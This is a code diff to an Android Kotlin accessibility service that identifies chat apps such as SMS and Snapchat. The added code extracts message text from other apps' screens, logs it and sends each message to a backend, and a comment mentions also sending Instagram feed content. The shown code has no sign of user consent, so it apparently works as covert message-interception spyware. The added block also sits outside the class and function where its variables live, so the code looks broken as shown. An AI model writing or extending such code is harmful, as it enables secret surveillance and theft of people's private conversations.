@@ -79,6 +79,7 @@ class MyAccessibilityService : AccessibilityService() {
             packageName.contains("mms")        -> "SMS"
             packageName.contains("snapchat")  -> "Snapchat"
             
+            
             else -> null
         }
 
@@ -105,7 +106,21 @@ class MyAccessibilityService : AccessibilityService() {
     }
 }
 
+if (chatAppName != null) {
+    val source = event.source ?: return
+    val messages = extractChatMessages(source)
     
+    messages.forEach { msg ->
+        val now = System.currentTimeMillis()
+        if (msg != lastSentMessage || now - lastSentTime > COOLDOWN_MS) {
+            lastSentMessage = msg
+            lastSentTime = now
+            Log.d("ChatMonitor", "App: $chatAppName | Msg: $msg")
+            sendChatToBackend(appName = chatAppName, message = msg, node = source)
+        }
+    }
+}
+   
 if (contentAppName != null) {
     // Instagram ke liye sirf feed/scroll events pe content bhejo
     val isFeedEvent = event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
